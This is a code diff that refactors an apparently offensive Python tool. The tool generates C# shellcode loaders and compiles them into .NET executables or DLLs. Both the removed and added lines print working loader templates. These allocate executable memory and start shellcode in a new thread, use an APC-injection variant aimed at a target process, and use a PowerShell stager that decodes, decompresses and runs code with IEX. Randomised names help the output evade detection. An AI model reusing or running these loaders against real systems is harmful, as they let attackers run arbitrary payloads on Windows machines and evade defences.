@@ -151,9 +151,9 @@ Running shell command ({}) failed:
     return status
 
 def shell(cmd, alternative = False, output = False, surpressStderr = False):    
-    out = shell2(cmd, alternative, stdErrToStdout = output, surpressStderr = surpressStderr)
-
-    return out
+    return shell2(
+        cmd, alternative, stdErrToStdout=output, surpressStderr=surpressStderr
+    )
 
 def getCompressedPayload(filePath, returnRaw = False):
     out = io.BytesIO()
@@ -168,31 +168,10 @@ def getCompressedPayload(filePath, returnRaw = False):
         if returnRaw:
             return encoded
 
-    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
-        encoded.decode()
-    )
-    return powershell
+    return f"$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{encoded.decode()}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"
 
 def getPayloadCode(payload):
     return f'shellcode = "{payload}";'
-
-    payloadCode = '\n'
-
-    N = 50000
-    codeSlices = map(lambda i: payload[i:i+N], range(0, len(payload), N))
-
-    variables = []
-
-    num = 1
-    for code in codeSlices:
-        payloadCode += f'string shellcode{num} = "{code}";\n'
-        variables.append(f'shellcode{num}')
-        num += 1
-
-    concat = 'shellcode = ' + ' + '.join(variables) + ';\n'
-    payloadCode += concat
-
-    return payloadCode
 
 def getSourceFileContents(
   module, 
@@ -207,15 +186,24 @@ def getSourceFileContents(
   command = ''
 ):
 
-    templateName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
+    templateName = ''.join(
+        random.choice(string.ascii_letters)
+        for _ in range(random.randint(5, 15))
+    )
     if len(module) > 0:
         templateName = module
 
-    namespaceName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
+    namespaceName = ''.join(
+        random.choice(string.ascii_letters)
+        for _ in range(random.randint(5, 15))
+    )
     if len(namespace) > 0:
         namespaceName = namespace
 
-    methodName = ''.join(random.choice(string.ascii_letters) for x in range(random.randint(5, 15)))
+    methodName = ''.join(
+        random.choice(string.ascii_letters)
+        for _ in range(random.randint(5, 15))
+    )
     if len(method) > 0:
         methodName = method
 
@@ -226,9 +214,10 @@ def getSourceFileContents(
 
     launchCode = ''
 
-    if _type not in ['exec', 'run-command'] and _format == 'exe':
+    if _type not in ['exec', 'run-command']:
+        if _format == 'exe':
 
-        exeLaunchCode = string.Template('''
+            exeLaunchCode = string.Template('''
 
         $decompressionFuncs
 
@@ -246,65 +235,18 @@ def getSourceFileContents(
         }
 
         ''').safe_substitute(
-            decompressionFuncs = decompressionFuncs,
-            payloadCode = payloadCode
-        )
+                decompressionFuncs = decompressionFuncs,
+                payloadCode = payloadCode
+            )
 
 
-        launchCode = exeLaunchCode
+            launchCode = exeLaunchCode
 
-    elif _type not in ['exec', 'run-command'] and _format == 'raw':
+        elif _format == 'raw':
 
-        if not apc:
-            shellcodeLoader = string.Template('''
-        
-        [DllImport("kernel32")]
-        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport("kernel32")]
-        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
-
-        [DllImport("kernel32")]
-        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );
-
-        [DllImport("kernel32")]
-        private static extern bool CloseHandle(IntPtr hHandle);
-
-        [DllImport("kernel32")]
-        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );
-
-        private static UInt32 MEM_COMMIT = 0x1000;
-        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-        private static UInt32 MEM_RELEASE = 0x8000;
-
-        $decompressionFuncs
-
-        public static bool Execute() {
-
-            string shellcode = "";
-            $payloadCode
-            byte[] payload = DecompressString(shellcode);
-
-            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(payload, 0, funcAddr, payload.Length);
-            IntPtr hThread = IntPtr.Zero;
-            UInt32 threadId = 0;
-
-            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-
-            CloseHandle(hThread);
-            VirtualFree(funcAddr, 0, MEM_RELEASE);
-
-            return true;
-        }                                           
-
-        ''').safe_substitute(
-        decompressionFuncs = decompressionFuncs,
-        payloadCode = payloadCode
-    )
-        else:
-            shellcodeLoader = string.Template('''
+            shellcodeLoader = (
+                string.Template(
+                    '''
 
         $decompressionFuncs
 
@@ -471,17 +413,68 @@ def getSourceFileContents(
         public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
         int dwSize, uint flNewProtect, out uint lpflOldProtect);
       
-      ''').safe_substitute(
-        decompressionFuncs = decompressionFuncs,
-        templateName = templateName,
-        payloadCode = payloadCode,
-        targetProcess = targetProcess
-    )
+      '''
+                ).safe_substitute(
+                    decompressionFuncs=decompressionFuncs,
+                    templateName=templateName,
+                    payloadCode=payloadCode,
+                    targetProcess=targetProcess,
+                )
+                if apc
+                else string.Template(
+                    '''
+        
+        [DllImport("kernel32")]
+        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);
 
-        launchCode = shellcodeLoader
+        [DllImport("kernel32")]
+        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
 
-    elif _type not in ['exec', 'run-command']:
-        powershellLaunchCode = string.Template('''
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId );
+
+        [DllImport("kernel32")]
+        private static extern bool CloseHandle(IntPtr hHandle);
+
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds );
+
+        private static UInt32 MEM_COMMIT = 0x1000;
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        private static UInt32 MEM_RELEASE = 0x8000;
+
+        $decompressionFuncs
+
+        public static bool Execute() {
+
+            string shellcode = "";
+            $payloadCode
+            byte[] payload = DecompressString(shellcode);
+
+            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(payload, 0, funcAddr, payload.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+
+            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+            CloseHandle(hThread);
+            VirtualFree(funcAddr, 0, MEM_RELEASE);
+
+            return true;
+        }                                           
+
+        '''
+                ).safe_substitute(
+                    decompressionFuncs=decompressionFuncs,
+                    payloadCode=payloadCode,
+                )
+            )
+            launchCode = shellcodeLoader
+
+        else:
+            powershellLaunchCode = string.Template('''
         $decompressionFuncs
 
         public static bool Execute() {
@@ -503,13 +496,13 @@ def getSourceFileContents(
         }      
 
         ''').safe_substitute(
-            decompressionFuncs = decompressionFuncs,
-            payload2 = base64.b64encode(payload.encode()).decode()
-        )
+                decompressionFuncs = decompressionFuncs,
+                payload2 = base64.b64encode(payload.encode()).decode()
+            )
 
-        launchCode = powershellLaunchCode
+            launchCode = powershellLaunchCode
 
-    namespaceStart = 'namespace ' + namespaceName + ' {'
+    namespaceStart = f'namespace {namespaceName}' + ' {'
     namespaceStop = '}'
 
     if dontUseNamespace:
@@ -843,7 +836,7 @@ def main(argv):
 
           if args.inputFile.endswith('.exe'):
               return False
-    
+
       payload = getCompressedPayload(args.inputFile, _format != 'powershell')
     else:
       payload = args.inputFile
@@ -876,13 +869,16 @@ def main(argv):
             sys.exit(1)
 
         with tempfile.NamedTemporaryFile() as f:
-            srcfile = f.name + '.cs'
+            srcfile = f'{f.name}.cs'
 
         target = 'winexe'
         if args.output.lower().endswith('.dll'):
             target = 'library'
         else:
-            output = output.replace('public ' + templateName + '()', 'static public void Main(String[] args)')
+            output = output.replace(
+                f'public {templateName}()',
+                'static public void Main(String[] args)',
+            )
 
 
         with open(srcfile, 'w') as f:
@@ -890,24 +886,20 @@ def main(argv):
 
         p = COMPILER_BASE.replace('<VER>', COMPILERS[args.dotnet_ver])
 
-        if args.compile == 'x64':
-          p = p.replace('<ARCH>', '64')
-        else:
-          p = p.replace('<ARCH>', '')
-
+        p = (
+            p.replace('<ARCH>', '64')
+            if args.compile == 'x64'
+            else p.replace('<ARCH>', '')
+        )
         if args.type == 'regasm':
-          cmd = p + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:{} /keyfile:key.snk {}'.format(
-              management, target, args.output, srcfile
-          )
+            cmd = f'{p} /o+ /r:System.EnterpriseServices.dll{management} /target:{target} /out:{args.output} /keyfile:key.snk {srcfile}'
         else:
-          cmd = p + ' /o+ /r:System.EnterpriseServices.dll{} /target:{} /out:{} {}'.format(
-              management, target, args.output, srcfile
-          )
+            cmd = f'{p} /o+ /r:System.EnterpriseServices.dll{management} /target:{target} /out:{args.output} {srcfile}'
 
         if os.path.isfile(args.output):
           os.remove(args.output)
 
-        print('Compiling as .NET ' + COMPILERS[args.dotnet_ver] + ':\n\t' + cmd + '\n')
+        print(f'Compiling as .NET {COMPILERS[args.dotnet_ver]}' + ':\n\t' + cmd + '\n')
         out = shell(os.path.expandvars(cmd))
         print(out)
 
@@ -917,12 +909,11 @@ def main(argv):
             if os.path.isfile(srcfile): os.remove(srcfile)
             return 1
 
+    elif len(args.output) > 0:
+        with open(args.output, 'w') as f:
+            f.write(output)
     else:
-        if len(args.output) > 0:
-            with open(args.output, 'w') as f:
-                f.write(output)
-        else:
-            print(output)
+        print(output)
 
     commands = '''
 
